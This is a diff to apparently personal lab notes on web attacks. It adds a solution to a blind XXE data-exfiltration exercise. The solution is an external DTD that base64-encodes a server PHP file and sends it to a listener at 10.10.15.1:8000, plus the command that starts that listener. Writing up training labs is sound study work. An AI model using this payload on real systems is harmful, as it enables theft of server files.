@@ -93,6 +93,18 @@ python3 -m http.server 8000
 ## Blind Data Exfiltration
 
 >**Q. Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.**
+```bash
+sudo nano xxe2.dtd 
+```
+
+```dtd
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.15.1:8000/?content=%file;'>">
+```
+
+```bash
+php -S 0.0.0.0:8000
+```
 
 ## Web Attacks - Skills Assessment
 
